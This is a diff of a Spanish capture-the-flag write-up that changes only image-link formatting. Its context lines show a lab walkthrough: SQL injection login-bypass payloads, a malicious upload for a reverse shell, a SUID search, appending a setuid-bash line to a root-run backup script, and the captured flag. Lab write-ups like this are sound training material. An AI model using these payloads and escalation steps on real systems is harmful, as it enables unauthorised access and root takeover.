@@ -50,18 +50,18 @@ dirsearch -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -e all
 
 - **Tecnologías:** [[Apache]], [[PHP]].
 
-![[image20260425075030.png]]
+![](image20260425075030.png)
 
 - **Directorias hallados:** `/admin`, `/uplodas`.
 
-![[image20260425075250.png]]
+![](image20260425075250.png)
 
 ---
 ## 4. Análisis y Explotación
 
 Se verifican los directorios hallados:
 
-![[image20260425075727.png]]
+![](image20260425075727.png)
 ### Vector de entrada: [[Authentication Based Payloads]]
 Introducir una comilla simple o paréntesis en un input y ver si da un error de backend o sintaxis SQL. Si nos devuelve un error esa web es vulnerable a SQL Inyection.
 
@@ -69,14 +69,14 @@ Introducir una comilla simple o paréntesis en un input y ver si da un error de 
 admin') or ('1'='1'--
 ```
 
-![[image20260425081230.png]]
+![](image20260425081230.png)
 
 - **Paylod utilizado:** [[../../../03_Payloads/SQL Injection en Login|SQL Injection en Login]]
 ```sql
 ' or 1=1 --+
 ```
 
-![[image20260425081906.png]]
+![](image20260425081906.png)
 ### Post-Explotación
 
 - Se observa la posibilidad de subir un archivo malicioso para obtener una Reverse Shell
@@ -85,7 +85,7 @@ admin') or ('1'='1'--
 ifconfig
 ```
 
-![[image20260425082846.png]]
+![](image20260425082846.png)
 
 - Se configura un listener:
 ```bash
@@ -93,28 +93,29 @@ ifconfig
 ```
 
 - Se sube el archivo y se obtiene la Reverse Shell
-![[image20260425083516.png|490]]
+![](image20260425083516.png|490)
 - **usuario obtenido:** `www-data` 
 - Se procede a mejorar shell
-![[image20260425084359.png]]
+![](image20260425084359.png)
 - **Escalada de privilegios:** - Se utiliza el siguiente comando para detectas un binario SUID mal configurado.
 
 ```bash
 find / -user root -perm /4000 2>/dev/null
 ```
 
-![[image20260425085302.png]]
+![](image20260425085302.png)
 
 - Se buscan otras vías y se encuentra un archivo que contiene credenciales
-![[image20260425091104.png]]
+
+![](image20260425091104.png)
 
 - El usuario dbbackup pertenece al grupo backupgroup
 
-![[image20260425091636.png]]
+![](image20260425091636.png|538)
 
 - Se obtiene usuario dbbackup
 
-![[image20260425093307.png]]
+![](image20260425093307.png)
 ```bash
 dbbackup@datavault-ctf:/$ id
 uid=1000(dbbackup) gid=1000(dbbackup) groups=1000(dbbackup),1001(backupgroup)
@@ -123,11 +124,11 @@ uid=1000(dbbackup) gid=1000(dbbackup) groups=1000(dbbackup),1001(backupgroup)
 
 - Se comprueba si el archivo sync.sh es editable
 
-![[image20260425094643.png]]
+![](image20260425094643.png)
 
 - No es posible editarlo
 
-![[image20260425094743.png]]
+![](image20260425094743.png)
 
 - Sin embargo permite editarlo  mediante comando
 
@@ -135,12 +136,12 @@ uid=1000(dbbackup) gid=1000(dbbackup) groups=1000(dbbackup),1001(backupgroup)
  echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /opt/backup/sync.sh
 ```
 
-![[image20260425100559.png]]
+![](image20260425100559.png)
 ### Captura de Flag
 
 `FLAG{MySQL_UDF_Exploitation_Master_2024}
 `
-![[image20260425100300.png]]
+![](image20260425100300.png)
 
 ---
 ## 5. Recomendaciones y Conclusiones
